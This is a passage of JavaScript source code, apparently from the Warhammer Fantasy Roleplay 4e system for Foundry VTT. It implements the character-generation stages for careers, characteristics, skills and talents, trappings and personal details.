    else if (this.data.subspecies && game.wfrp4e.tables.findTable("career", rollSpecies + "-" + this.data.subspecies))
      rollSpecies += "-" + this.data.subspecies;
    

    // If Human (no subspecies) and no "human" career table exists, use `human-reiklander` if it exists
    // This is backwards compatibility (human-reiklander table changed to just human)
    if (this.data.species == "human" && !game.wfrp4e.tables.findTable("career", "human") && game.wfrp4e.tables.findTable("career", "human-reiklander"))
    {
      rollSpecies = "human-reiklander";
    }

    for (let i = 0; i < number; i++) {
      let careerResult = await this.rollCareerTable(rollSpecies);
      let careerName = careerResult.text;

      // Some books that add careers define replacement options, such as (If you roll career X you can use this new career Y (e.g. Soldier to Ironbreaker))
      // If there's a replacement option for a given career, add that replacement career too
      let replacementOptions = game.wfrp4e.config.speciesCareerReplacements[this.data.species]?.[careerName] || [];
      replacementOptions = replacementOptions.concat(game.wfrp4e.config.speciesCareerReplacements[`${this.data.species}-${this.data.subspecies}`]?.[careerName] || []);

      let t1Careers = await this.findT1Careers(careerName);
      
      this.context.careers = this.context.careers.concat(t1Careers);
      if (replacementOptions.length > 0)
      {
        let replacements = await this.findT1Careers(replacementOptions);
        this.context.replacements = this.context.replacements.concat(replacements);
      }

      this.updateMessage("Rolled", {rolled : t1Careers.map(i => i.name).join(", ")});
    }
    this.render(true);
  }

  /**
   * Rolls on a career table based on provided species
   * Separated into its own function to cleanly overwrite in modules
   * 
   * @param {String} species Species table to roll on
   * @returns 
   */
  async rollCareerTable(species)
  {
    return await game.wfrp4e.tables.rollTable("career", {}, species);
  }

  /**
   * Given a career name, find the T1 item for that career
   * "Witch Hunter" -> Interrogator Item
   *
   * @param {String} careerName Name of career to be posted
   */
  async findT1Careers(careerNames) {

    let careers = await this.careers;
    let careersFound = [];
    
    if (typeof careerNames == "string")
      careerNames = [careerNames];

    // Find the tier 1 rank that corresponds with the career name
    for (let c of careers) {
      if (careerNames.includes(c.system.careergroup.value) && c.system.level.value == 1)
        careersFound.push(c);
      if (careersFound.length == careerNames.length)
        break;
    }

    if (careerNames.length != careersFound.length)
      this.showError("CareerItems", {num : careerNames.length - careersFound.length, careers : careerNames.toString()});
    return careersFound;
  }

  async loadCareers()
  {
    let packs = game.wfrp4e.tags.getPacksWithTag("career");
    let careers = game.items.filter(i => i.type == "career");

    let counter = 1;
    let num = packs.length;
    for (let pack of packs)
    {
      SceneNavigation.displayProgressBar({label: game.i18n.localize("CHARGEN.Career.LoadingCareers"), pct: Math.round((counter / num) * 100) });
      counter++;
      careers = careers.concat((await pack.getDocuments()).filter(i => i.type == "career"));
    }

    return careers;
  }

  
  activateListeners(html) {
    super.activateListeners(html);
    const dragDrop = new DragDrop({
      dropSelector: '.chargen-content',
      permissions: { drop: () => true },
      callbacks: { drop: this._onDrop.bind(this) },
    });

    dragDrop.bind(html[0]);
  }
}

const Step = {NOT_STARTED : 0, FIRST_ROLL : 1, SWAPPING : 2, REROLL : 3, ALLOCATING : 4};

class AttributesStage extends ChargenStage {

  journalId = "Compendium.wfrp4e-core.journals.JournalEntry.IQ0PgoJihQltCBUU.JournalEntryPage.GaZa9sU4KjKDswMr"
  static get defaultOptions() {
  const options = super.defaultOptions;
    options.resizable = true;
    options.width = 400;
    options.height = 785;
    options.classes.push("career");
    options.minimizable = true;
    options.title = game.i18n.localize("CHARGEN.StageAttributes");
    return options;
  }

  static get title() { return game.i18n.localize("CHARGEN.StageAttributes"); }
  get template() { return "systems/wfrp4e/templates/apps/chargen/attributes.hbs"; }



  constructor(...args) {
    super(...args);

    // Step 1: First roll, Step 2: Swapping, Step 3: Reroll, Step 4: Allocating 
    this.context.step = Step.NOT_STARTED;
    this.context.characteristics = {
      ws: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      bs: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      s: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      t: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      i: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      ag: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      dex: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      int: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      wp: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
      fel: { formula: "", roll: 0, add: 0, total: 0, allocated: 0, advances: 0 },
    },
      this.context.allocation = {
        total: 100,
        spent: 0
      };
    this.context.meta = {
      fate: { base: 0, allotted: 0, total: 0 },
      resilience: { base: 0, allotted: 0, total: 0 },
      extra: 0,
      left: 0
    };
    this.context.move = 4;
    this.context.exp = 50;
  }

  async getData() {
    let data = await super.getData();
    this.calculateTotals();

    if (this.context.step <= Step.FIRST_ROLL) {
      this.context.exp = 50;
    }
    else if (this.context.step == Step.SWAPPING && !this.context.hasRerolled) {
      this.context.exp = 25;
    }

    else
      this.context.exp = 0;

    return data;
  }

  async rollAttributes(ev, step) {
    if (step)
      this.context.step = step;
    else
      this.context.step++;

    if (this.context.step == Step.FIRST_ROLL)
    {
      await this.updateMessage("RolledCharacteristics");
    }
    else if (this.context.step == Step.REROLL)
    {
      await this.updateMessage("ReRolledCharacteristics");
    }

    let species = this.data.species;
    let subspecies = this.data.subspecies;

    let characteristicFormulae = game.wfrp4e.config.speciesCharacteristics[species];
    if (subspecies && game.wfrp4e.config.subspecies[species][subspecies].characteristics)
      characteristicFormulae = game.wfrp4e.config.subspecies[species][subspecies].characteristics;

    for (let ch in this.context.characteristics) {
      let [roll, bonus] = characteristicFormulae[ch].split("+").map(i => i.trim());
      roll = roll || "2d10";
      bonus = bonus || 0;
      this.context.characteristics[ch].formula = characteristicFormulae[ch];
      this.context.characteristics[ch].roll = (await new Roll(roll).roll()).total;
      this.context.characteristics[ch].add = bonus;
      this.context.characteristics[ch].allocated = 0;
    }

    this.context.rolledCharacteristics = foundry.utils.duplicate(this.context.characteristics); // Used to restore roll if user goes back a step

    this.context.movement = game.wfrp4e.config.speciesMovement[species],
      this.context.meta.fate.base = game.wfrp4e.config.speciesFate[species],
      this.context.meta.resilience.base = game.wfrp4e.config.speciesRes[species],
      this.context.meta.extra = game.wfrp4e.config.speciesExtra[species];


    this.calculateTotals();

    this.updateMessage(undefined, undefined, `
    <div class="flexcol" style="text-align: center">
      <div class="flexrow">
        <div>
          ${Object.keys(this.context.characteristics)
            .map(i => game.wfrp4e.config.characteristicsAbbrev[i])
            .join("</div><div>")
          }
        </div>
      </div>
      <div class="flexrow">
        <div>
        ${Object.values(this.context.characteristics)
          .map(i => i.total)
          .join("</div><div>")
        }
        </div>
      </div>
    </div>
    `);

    this.render();
  }

  calculateTotals() {
    this.context.allocation.spent = 0;
    this.context.advances = 0;
    for (let ch in this.context.characteristics) {
      let characteristic = this.context.characteristics[ch];
      let base = this.context.step == Step.ALLOCATING ? characteristic.allocated : characteristic.roll;
      characteristic.initial = base + Number(characteristic.add);
      characteristic.total = characteristic.initial + Number(characteristic.advances);
      this.context.allocation.spent += characteristic.allocated;
      this.context.advances += Number(characteristic.advances); // Used for validation, cannot be above 5
    }
    let fate = this.context.meta.fate;
    let resilience = this.context.meta.resilience;
    fate.total = fate.base + fate.allotted;
    resilience.total = resilience.base + resilience.allotted;
    this.context.meta.left = this.context.meta.extra - (resilience.allotted + fate.allotted);
  }

  validateTotals() {
    this.calculateTotals();
    let valid = true;
    if (this.context.meta.left < 0)
    {
      this.showError("MetaAllocation");
      valid = false;
    }
    if (this.context.allocation.spent > 100)
    {
      this.showError("CharacteristicAllocation");
      valid = false;
    }

    if (this.context.advances > 5)
    {
      this.showError("CharacteristicAdvances");
      valid = false;
    }

    if (this.context.step == Step.ALLOCATING)
    {
      let inBounds = true;
      for (let ch in this.context.characteristics) {
        let characteristic = this.context.characteristics[ch];
        if (characteristic.allocated < 4 || characteristic.allocated > 18)
          inBounds = false;
      }

      if(!inBounds)
      {
        this.showError("CharacteristicAllocationBounds");
        valid = false;
      }
    }


    return valid
  }

  validate() {
    return super.validate() && this.validateTotals();
  }

  swap(ch1, ch2) {
    if (this.context.step < Step.SWAPPING)
      this.context.step = Step.SWAPPING;

    let ch1Roll = foundry.utils.duplicate(this.context.characteristics[ch1].roll);
    let ch2Roll = foundry.utils.duplicate(this.context.characteristics[ch2].roll);

    this.context.characteristics[ch1].roll = ch2Roll;
    this.context.characteristics[ch2].roll = ch1Roll;

    this.updateMessage("SwappedCharacteristics", {ch1 : game.wfrp4e.config.characteristics[ch1], ch2: game.wfrp4e.config.characteristics[ch2]});

    this.render(true);
  }

  activateListeners(html) {
    super.activateListeners(html);
    const dragDrop = new DragDrop({
      dragSelector: '.ch-drag',
      dropSelector: '.ch-drag',
      permissions: { dragstart: () => true, drop: () => true },
      callbacks: { drop: this.onDropCharacteristic.bind(this), dragstart: this.onDragCharacteristic.bind(this) },
    });

    dragDrop.bind(html[0]);


    html.find(".meta input").on("change", (ev) => {
      // Bind value to be nonnegative
      ev.currentTarget.value = Math.max(0, Number(ev.currentTarget.value));
      this.context.meta[ev.currentTarget.dataset.meta].allotted = Number(ev.currentTarget.value);
      this.render(true);
    });

    html.find(".ch-allocate").on("change", (ev) => {
      // Bind value to be nonnegative
      ev.currentTarget.value = Math.max(0, Number(ev.currentTarget.value));
      if (ev.currentTarget.value > 18 || ev.currentTarget.value < 4)
      {
        this.showError("CharacteristicAllocationBounds");
        ev.currentTarget.value = 0;
        return 
      }
      this.context.characteristics[ev.currentTarget.dataset.ch].allocated = Number(ev.currentTarget.value);
      this.render(true);
    });

    html.find(".ch-advance").on("change", ev => {
      // Bind value to be nonnegative
      ev.currentTarget.value = Math.max(0, Number(ev.currentTarget.value));
      this.context.characteristics[ev.currentTarget.dataset.ch].advances = Number(ev.currentTarget.value);
      this.render(true);
    });
  }

  reroll(ev) {
    this.context.hasRerolled = true;
    // Set to step 3
    this.rollAttributes(ev, 3);
  }

  allocate(ev) {
    this.context.step = Step.ALLOCATING;
    this.updateMessage("AllocateCharacteristics");

    this.render(true);
  }

  rearrange(ev)
  {
    this.context.step = Step.SWAPPING;
    this.render(true);
  }

  // Cancel allocation or swapping, restore to the last rolled characteristic
  cancel(ev)
  {
    if (this.context.hasRerolled)
    this.context.step = Step.REROLL;
    else 
      this.context.step = Step.FIRST_ROLL;
    this.context.characteristics = foundry.utils.duplicate(this.context.rolledCharacteristics);
    this.render(true);
  }

  _updateObject(ev, formData) {
    for (let ch in this.context.characteristics) {
      this.data.characteristics[ch] = { initial: this.context.characteristics[ch].initial, advances: this.context.characteristics[ch].advances };
    }
    this.data.fate.base = this.context.meta.fate.base;
    this.data.fate.allotted = this.context.meta.fate.allotted;
    this.data.resilience.base = this.context.meta.resilience.base;
    this.data.resilience.allotted = this.context.meta.resilience.allotted;
    this.data.move = game.wfrp4e.config.speciesMovement[this.data.species];
    this.data.exp.characteristics = this.context.exp;
    super._updateObject(ev, formData);
  }

  onDragCharacteristic(ev) {
    ev.dataTransfer.setData("text/plain", JSON.stringify({ ch: ev.currentTarget.dataset.ch }));
  }

  onDropCharacteristic(ev) {
    if (ev.currentTarget.dataset.ch) {
      let ch = JSON.parse(ev.dataTransfer.getData("text/plain")).ch;
      this.swap(ev.currentTarget.dataset.ch, ch);
    }
  }
}

class SkillsTalentsStage extends ChargenStage {
  journalId = "Compendium.wfrp4e-core.journals.JournalEntry.IQ0PgoJihQltCBUU.JournalEntryPage.f5Y4XenZVtDU2GUo"
  static get defaultOptions() {
    const options = super.defaultOptions;
    options.resizable = true;
    options.width = 450;
    options.height = 800;
    options.classes.push("skills-talents");
    options.minimizable = true;
    options.cannotResubmit = true;
    options.title = game.i18n.localize("CHARGEN.StageSkillsTalents");
    return options;
  }

  static get title() { return game.i18n.localize("CHARGEN.StageSkillsTalents"); }


  constructor(...args) {
    super(...args);
    let { skills, talents, randomTalents, talentReplacement } = WFRP_Utility.speciesSkillsTalents(this.data.species, this.data.subspecies);

    for (let [key, value] of Object.entries(randomTalents)) {
      let table = game.wfrp4e.tables.findTable(key);

      if (!(table instanceof RollTable)) {
        ui.notifications.error(game.i18n.format("CHARGEN.ERROR.TalentsTableNotFound", {key, species: this.data.species, subspecies: this.data.subspecies}));
        continue;
      }

      this.context.speciesTalents.randomTalents[key] = {
        key: key,
        name: table.name,
        count: Number(value),
        left: Number(value),
        rolled: false,
        talents: []
      };
    }

    for (let skill of skills) {
      this.context.speciesSkills[skill] = 0;
    }

    for (let talent of talents) {

      // Set random talent count
      if (Number.isNumeric(talent)) {
        this.context.speciesTalents.randomTalents.talents.count = Number(talent);
      }

      // Comma means it's a choice
      else if (talent.includes(",")) {
        this.context.speciesTalents.choices.push(talent);
        this.context.speciesTalents.chosen.push("");
      }

      else
        this.context.speciesTalents.normal.push(talent);
    }

    for (let skill of this.data.items.career.system.skills) {
      this.context.careerSkills[skill] = 0;
    }

    for (let talent of this.data.items.career.system.talents) {
      this.context.careerTalents[talent] = false;
    }

    this.context.talentReplacement = talentReplacement;
  }

  get template() {
    return "systems/wfrp4e/templates/apps/chargen/skills-talents.hbs";
  }

  context = {
    speciesSkills: {},
    speciesTalents: {
      normal: [],
      chosen: [],
      choices: [],
      randomTalents: {}
    },
    careerSkills: {},
    careerTalents: {}
  };

  async getData() {
    let data = await super.getData();

    data.speciesSkillAllocation = {
      0: [],
      3: [],
      5: []
    };

    /**#region species talents*/

    data.talents = {
      normal: this.context.speciesTalents.normal,
      random: this.#prepareRandomTalentData(),
      chosen: this.context.speciesTalents.chosen,

      // Separate choices ("Savvy,Suave") into {name : Suave, chosen : true/false}, {name : Savvy, chosen : true/false}
      choices: this.context.speciesTalents.choices.map((choice, index) => {
        return choice.split(",").map(i => {
          let name = i.trim();
          let tooltip = null;
          // matches `random[x]` and `random[x][key]` where `x` is a digit and `key` is a string
          let regex = /random\[(\d)](?:\[?([a-zA-Z-_]+)])?/i;
          let [match, amount, key] = name.match(regex) ?? [];
          amount = Number(amount);

          // Check if talent is an additional random (syntax => random[x] where x is the number of random talents to roll)
          if (match) {
            if (amount === 1)
              name = game.i18n.localize("CHARGEN.AdditionalRandomTalent");
            else
              name = game.i18n.format("CHARGEN.XAdditionalRandomTalents", { x: amount });

            // if table key was not specified, fall back to default table
            if (!key)
              key = 'talents';

            tooltip = this.context.speciesTalents.randomTalents[key]?.name;
          }

          let chosen = this.context.speciesTalents.chosen[index] === name;

          // If random is selected, add number to random talents to roll
          let table = this.context.speciesTalents.randomTalents[key];
          if (table && chosen) {
            table.left += Number(amount);
          }

          return {
            name,
            chosen,
            tooltip
          };
        });
      })
    };

    /**#endregion species talents*/

    // Sort into arrays
    for (let skill in this.context.speciesSkills) {
      data.speciesSkillAllocation[this.context.speciesSkills[skill]].push(skill);
    }

    // This case happens when user chose to roll an additional random talent, then changed their mind. Remove the extra talents
    for (let dataTable of data.talents.random) {
      if (dataTable.left < 0) {
        let table = this.context.speciesTalents.randomTalents[dataTable.key];
        let spliceIndex = table.talents.length - Math.abs(dataTable.left);
        table.talents.splice(spliceIndex);                    // Remove talents in context
        dataTable.talents.splice(spliceIndex);                // Reflect removed talents in template data
        dataTable.left = table.count - table.talents.length;  // Should be 0
      }
    }

    data.careerSkills = this.context.careerSkills;
    data.careerTalents = this.context.careerTalents;
    data.pointsAllocated = 40 - Object.values(this.context.careerSkills).reduce((prev, current) => prev + current, 0);

    return data;
  }

  /**
   * Prepare random talents data to be displayed in template, also check for duplicates
   *
   * @return {{key:string,name:string,count:number,left:number,rolled:boolean,talents:array}[]}
   */
  #prepareRandomTalentData() {
    // Convert table data from Map to Array for Handlebars
    let tablesArray = this.#getTalentTablesArray();
    let tables = tablesArray.map(t => {
      t.left = t.count - t.talents.length;
      t.talents = t.talents.map(i => {
        if (typeof i === 'object') return i;

        return {
          name : i,
          duplicate: false
        };
      });

      return t;
    });

    // Create a reference array of all talents across all tables for easy duplicate checking
    let allTalents = this.#reduceRandomTalents();
    // Add chosen talents (if they were chosen = not empty)
    allTalents.push(...this.context.speciesTalents.chosen.filter(t => t));

    // Check and mark duplicates
    tables.forEach(table => table.talents.forEach(talent => talent.duplicate = allTalents.filter(t => t === talent.name).length >= 2));

    return tables;
  }

  /**
   * Converts Random Talents Table Map to Array for easier mass operation handling
   *
   * @return {{key:string,name:string,count:number,left:number,rolled:boolean,talents:array}[]}
   */
  #getTalentTablesArray() {
    return Object.values(this.context.speciesTalents.randomTalents);
  }

  async _updateObject(ev, formData) {
    // Merge career/species skill advances into data
    for (let skill in this.context.speciesSkills) {
      if (isNaN(this.data.skillAdvances[skill]))
        this.data.skillAdvances[skill] = 0;
      this.data.skillAdvances[skill] += this.context.speciesSkills[skill];
    }
    for (let skill in this.context.careerSkills) {
      if (isNaN(this.data.skillAdvances[skill]))
        this.data.skillAdvances[skill] = 0;
      this.data.skillAdvances[skill] += this.context.careerSkills[skill];
    }

    let careerTalent;
    for (let talent in this.context.careerTalents) {
      if (this.context.careerTalents[talent])
        careerTalent = talent;
    }

    let allTalents = [
      ...this.context.speciesTalents.normal,
      ...this.context.speciesTalents.chosen,
      ...this.#reduceRandomTalents(),
      careerTalent
    ];

    let talents = await Promise.all(allTalents.map(async i => {
      try {
        return await WFRP_Utility.findTalent(i);
      } catch(error) {
        // Ignore not found.
        // This is mainly important because when a user chooses "Additional Random Talent" as a talent, it won't be found
        WFRP_Utility.log(`Talent ${i} was not found`, {error, context: this.context});
      }
    }));

    this.data.items.talents = talents.filter(i => i);
    super._updateObject(ev, formData);

  }

  /**
   * Reduces all random table data from complex Map to simple one-dimensional Array of Talent names
   *
   * @return {string[]}
   */
  #reduceRandomTalents() {
    let tables = this.#getTalentTablesArray();

    return tables.reduce((talents, table) => {
      talents.push(...table.talents.map(talent => talent.name));
      return talents;
    }, []);
  }

  async validate() {
    let valid = super.validate();

    if (!this.validateSkills())
      valid = false;

    if (!this.#validateRandomSpeciesTalents()) {
      this.showError("SpeciesTalentsNotRolled");
      valid = false;
    }

    if (this.context.speciesTalents.chosen.filter(i => i).length < this.context.speciesTalents.choices.length) {
      this.showError("SpeciesTalentsNotChosen");
      valid = false;
    }

    if (Object.values(this.context.careerTalents).every(i => i == false)) {
      this.showError("CareerTalentNotChosen");
      valid = false;
    }

    if (Object.values(this.context.careerSkills).reduce((prev, current) => prev + current, 0) > 40) {
      this.showError("CareerSkillAllocation");
      valid = false;
    }

    return valid
  }

  #validateRandomSpeciesTalents() {
    return !this.#getTalentTablesArray().some(table => table.left > 0 || (table.count > 0 && table.rolled === false));
  }

  validateSkills() {
    let skills = Object.values(this.context.speciesSkills);
    let threes = skills.filter(i => i == 3).length;
    let fives = skills.filter(i => i == 5).length;

    if (threes > 3 || fives > 3) {
      this.showError("SpeciesSkillAdvancements");
      return false
    }
    else return true
  }



  activateListeners(html) {
    super.activateListeners(html);
    const dragDrop = new DragDrop({
      dragSelector: '.drag-skill',
      dropSelector: '.drag-area',
      permissions: { dragstart: () => true, drop: () => true },
      callbacks: { drop: this.onDropSkill.bind(this), dragstart: this.onDragSkill.bind(this) },
    });

    dragDrop.bind(html[0]);


    html.find(".talent-choice input").click(ev => {
      let target = ev.currentTarget.name?.split("-")[1];

      if (target == "career") {
        for (let talent of this.data.items.career.system.talents) {
          this.context.careerTalents[talent] = (talent == ev.currentTarget.value);
        }
      }
      else {
        this.context.speciesTalents.chosen[target] = ev.currentTarget.value;
      }

      this.render(true);

    });

    html.find(".career-skills input").change(ev => {
      ev.currentTarget.value = Math.max(0, Number(ev.currentTarget.value));
      if (ev.currentTarget.value > 10) {
        ev.currentTarget.value = 0;
        this.showError("CareerSkillAllocationBounds");
      }
      this.context.careerSkills[ev.currentTarget.dataset.skill] = Number(ev.currentTarget.value);
      this.render(true);
    });

    html.find(".reroll-duplicate").click(async ev => {
      ev.stopPropagation();
      let index = Number(ev.currentTarget.dataset.index);
      let key = ev.currentTarget.dataset.table;
      let table = this.context.speciesTalents.randomTalents[key];

      let talent = await game.wfrp4e.tables.rollTable(table.key);
      talent = await this.checkTalentReplacement(talent.text);
      table.talents[index] = talent;
      this.updateMessage("RerolledDuplicateTalent", { rolled: talent });
      this.render(true);
    });
  }


  onDropSkill(ev) {
    let skill = JSON.parse(ev.dataTransfer.getData("text/plain")).skill;
    this.context.speciesSkills[skill] = Number(ev.currentTarget.dataset.advance);
    if (!this.validateSkills()) {
      this.context.speciesSkills[skill] = 0;
    }

    this.render(true);
  }

  onDragSkill(ev) {
    ev.dataTransfer.setData("text/plain", JSON.stringify({ skill: ev.currentTarget.textContent.trim() }));
  }

  async rollRandomTalents(ev) {
    let number = Number(ev.currentTarget.dataset.number) || 0;
    let key = ev.currentTarget.dataset.table || "talents";
    let table = this.context.speciesTalents.randomTalents[key];
    if (!table) return;

    for (let i = 0; i < number; i++) {
      let talent = await game.wfrp4e.tables.rollTable(table.key);
      talent = await this.checkTalentReplacement(talent.text);
      table.talents.push(talent);
    }

    table.rolled = true;
    this.updateMessage("Rolled", { rolled: table.talents.join(", ") });
    this.render(true);
  }

  async checkTalentReplacement(talent){
    if (this.context.talentReplacement[talent]) {
      let choice = await Dialog.confirm({
        title: game.i18n.localize("CHARGEN.SkillsTalents.ReplaceTalentDialog.Title"),
        content: game.i18n.format("CHARGEN.SkillsTalents.ReplaceTalentDialog.Content", {talent, replacement: this.context.talentReplacement[talent]})
      });

      if (choice) {
        this.updateMessage("ReplacedTalent", {talent, replacement: this.context.talentReplacement[talent]});
        return this.context.talentReplacement[talent];
      }
    }

    return talent
  }
}

class TrappingStage extends ChargenStage {
  journalId = "Compendium.wfrp4e-core.journals.JournalEntry.IQ0PgoJihQltCBUU.JournalEntryPage.hQipqLYlbBEjJEWL"
  static get defaultOptions() {
    const options = super.defaultOptions;
    options.resizable = true;
    options.width = 450;
    options.height = 600;
    options.classes.push("trappings");
    options.minimizable = true;
    options.title = game.i18n.localize("CHARGEN.StageTrappings");
    return options;
  }

  static get title() { return game.i18n.localize("CHARGEN.StageTrappings"); }

  get template() {
    return "systems/wfrp4e/templates/apps/chargen/trappings.hbs";
  }

  constructor(...args) {
    super(...args);

    this.context.classStrings = game.wfrp4e.config.classTrappings[this.data.items.career.system.class.value]?.split(",") || [];
    this.context.careerStrings = this.data.items.career.system.trappings;

    if (this.context.classStrings.length == 0) {
      this.showError("ClassTrappingsNotFound", { class: this.data.items.career.system.class.value });
    }

    this.context.class = Promise.all(this.context.classStrings.map(i => WFRP_Utility.find(i.trim(), game.wfrp4e.config.trappingItems)));
    this.context.career = Promise.all(this.context.careerStrings.map(i => WFRP_Utility.find(i, game.wfrp4e.config.trappingItems)));
  }

  context = {
    items: [],
    class: [],
    career: [],
    missing: null,
    added: []
  };

  async getData() {
    let data = await super.getData();
    this.context.class = await this.context.class;
    this.context.career = await this.context.career;

    if (!this.context.missing) {
      this.context.missing = [];

      this.context.class.forEach((trapping, i) => {
        if (!trapping) {
          this.context.missing.push({
            string: this.context.classStrings[i],
            choice: "keep"
          });
        }
      });

      this.context.career.forEach((trapping, i) => {
        if (!trapping) {
          this.context.missing.push({
            string: this.context.careerStrings[i],
            choice: "keep"
          });
        }
      });
    }

    this.context.class = this.context.class.filter(i => i);
    this.context.career = this.context.career.filter(i => i);
    return data;
  }

  activateListeners(html) {
    super.activateListeners(html);
    const dragDrop = new DragDrop({
      dropSelector: '.chargen-content',
      permissions: { drop: () => true },
      callbacks: { drop: this._onDrop.bind(this) },
    });

    dragDrop.bind(html[0]);

    html.find(".missing-trapping-choice input").click(ev => {
      let name = ev.currentTarget.name;
      let index = Number(name.split("-")[1]);
      this.context.missing[index].choice = ev.currentTarget.value;
      this.render(true);
    });

    html.find(".remove-trapping").click(ev => {
      let index = Number(ev.currentTarget.dataset.index);
      this.context.added.splice(index, 1);
      this.render(true);

    });

  }

  async _onDrop(ev) {
    let dragData = JSON.parse(ev.dataTransfer.getData("text/plain"));

    if (dragData.type == "Item") {
      this.context.added.push(await Item.implementation.fromDropData(dragData));
    }
    this.render(true);
  }

  _updateObject(ev, formData) {

    // Of the trappings not found, only keep the ones that are marked as "keep", and create a new miscellaneous trapping item for them
    let missing = this.context.missing.filter(i => i.choice == "keep").map(i => new ItemWfrp4e({ name: i.string, type: "trapping", system: { "trappingType.value": "misc" } }));

    this.data.items.trappings = missing.concat(this.context.class, this.context.career, this.context.added);
    super._updateObject(ev, formData);
  }
}

class DetailsStage extends ChargenStage {
  journalId = "Compendium.wfrp4e-core.journals.JournalEntry.IQ0PgoJihQltCBUU.JournalEntryPage.Q4C9uANCqPzlRKFD"
  static get defaultOptions() {
    const options = super.defaultOptions;
    options.resizable = true;
    options.width = 500;
    options.height = 700;
    options.classes.push("details");
    options.minimizable = true;
    options.title = game.i18n.localize("CHARGEN.StageDetails");
    return options;
  }

  static get title() { return game.i18n.localize("CHARGEN.StageDetails"); }

  get template() {
    return "systems/wfrp4e/templates/apps/chargen/details.hbs";
  }

  constructor(...args) {
    super(...args);
  }
  context = {
    gender: ""
  };


  async getData() {
    let data = await super.getData();
    return data;
  }

  activateListeners(html) {
    super.activateListeners(html);

    html.find(".roll-details").click(async (ev) => {
      let type = ev.currentTarget.dataset.type;
      if (this[type]) {
        let value = await this[type]();
        let input = $(ev.target).parents(".detail-form").find("input")[0];
        input.value = value;
      }
    });

    html.find("input[name='gender']").change(ev => {
      this.context.gender = ev.currentTarget.value; // Need to store gender to pass to name generation
    });
  }

  _updateObject(ev, formData) {
    this.data.details.name = formData.name;
    this.data.details.gender = formData.gender;
    this.data.details.age = formData.age;
    this.data.details.height = formData.height;
    this.data.details.eyes = formData.eyes;
    this.data.details.hair = formData.hair;
    this.data.details.motivation = formData.motivation;
    this.data.details.short = formData.short;
    this.data.details.long = formData.long;
    super._updateObject(ev, formData);
  }

  rollName() {
    return NameGenWfrp.generateName({ species: this.data.species, gender: this.context.gender });
  }
  async rollAge() {
    return (await new Roll(game.wfrp4e.config.speciesAge[this.data.species]).roll()).total;
  }
  async rollHeight() {
    let heightRoll = (await new Roll(game.wfrp4e.config.speciesHeight[this.data.species].die).roll()).total;
    let hFeet = game.wfrp4e.config.speciesHeight[this.data.species].feet;
    let hInches = game.wfrp4e.config.speciesHeight[this.data.species].inches + heightRoll;
    hFeet += Math.floor(hInches / 12);
    hInches = hInches % 12;
    return `${hFeet}'${hInches}`;
  }
  async rollEyes() {
    return (await game.wfrp4e.tables.rollTable("eyes", {}, this.data.species)).result;
  }
  async rollHair() {
    return (await game.wfrp4e.tables.rollTable("hair", {}, this.data.species)).result;
  }
  async rollMotivation() {
    return (await game.wfrp4e.tables.rollTable("motivation")).result;
  }
}

/**
 * This class is the center of character generation through the chat prompts (started with /char)
 */
class CharGenWfrp4e extends FormApplication {
  constructor(existing={}, options) {
    super(null, options);
    this.data = existing?.data || {
      species: null,
      subspecies: null,
      exp: {
        species: 0,
        characteristics: 0,
        career: 0
      },
      items: {
        career: null,
      },
      skillAdvances: {

      },
      characteristics: {
        ws: {initial: 0, advances : 0},
        bs: {initial: 0, advances : 0},
        s: {initial: 0, advances : 0},
        t: {initial: 0, advances : 0},
        i: {initial: 0, advances : 0},
        ag: {initial: 0, advances : 0},
        dex: {initial: 0, advances : 0},
        int: {initial: 0, advances : 0},
        wp: {initial: 0, advances : 0},
        fel: {initial: 0, advances : 0}
      },
      fate: { base: 0, allotted: 0 },
      resilience: { base: 0, allotted: 0 },
      move: 4,
      details : {
        gender : "",
        name : "",
        age : null,
        height : "",
        hair : "",
        eyes : "",
        short : "",
        long : "",
      },
      misc : {
        // Object for stages to add whatever data they wish to be merged into actor data
        // e.g. "system.details.motivation.value" : "Courage"
      }
    };
    this.stages = [
      {
        class: SpeciesStage,
        key: "species",
        dependantOn: [],
        app: null,
        complete: false
      },
      {
        class: CareerStage,
        key: "career",
        dependantOn: ["species"],
        app: null,
        complete: false
      },
      {
        class: AttributesStage,
        key: "attributes",
        dependantOn: ["career"],
        app: null,
        complete: false
      },
      {
        class: SkillsTalentsStage,
        key: "skills-talents",
        dependantOn: ["career"],
        app: null,
        complete: false
      },
      {
        class: TrappingStage,
        app: null,
        key: "trappings",
        dependantOn: ["career"],
        complete: false
      },
      {
        class: DetailsStage,
        app: null,
        key: "details",
        dependantOn: ["species"],
        complete: false
      }
    ];

    // If using existing data, record which stages were already complete
    if (existing?.stages)
    {
      for(let existingStage of existing.stages)
      {
        let stage = this.stages.find(s => s.key == existingStage.key);
        if (stage)
        {
          stage.complete = existingStage.complete;
        }
      }
    }

    this.actor = {type: "character", system: foundry.utils.deepClone(game.release.generation == 12 ? game.system.template.Actor.character : game.system.model.Actor.character), items: [] };

    if (!game.user.isGM)
    {
      ChatMessage.create({content : game.i18n.format("CHARGEN.Message.Start", {user : game.user.name})}).then(msg => this.message = msg);
    }

    // Warn user if they won't be able to create a character
    if (!game.user.isGM && !game.settings.get("core", "permissions").ACTOR_CREATE.includes(game.user.role) && !game.users.find(u => u.isGM && u.active))
    {
      ui.notifications.warn(game.i18n.localize("CHARGEN.NoGMWarning"), {permanent : true});
    }


    Hooks.call("wfrp4e:chargen", this);
  }


  static get defaultOptions() {
    const options = super.defaultOptions;
    options.id = "chargen";
    options.template = "systems/wfrp4e/templates/apps/chargen/chargen.hbs";
    options.classes = options.classes.concat("wfrp4e", "chargen");
    options.resizable = true;
    options.width = 1000;
    options.height = 600;
    options.minimizable = true;
    options.title = game.i18n.localize("CHARGEN.Title");
    return options;
  }


  async getData() {

    let skills = [];


    let allItems = [];
    for(let key in this.data.items)
    {
      allItems = allItems.concat(this.data.items[key]);
    }


    let allChanges = allItems
    .filter(i => i)
    .reduce((prev, current) => prev.concat(Array.from(current.effects)), []) // reduce items to effects
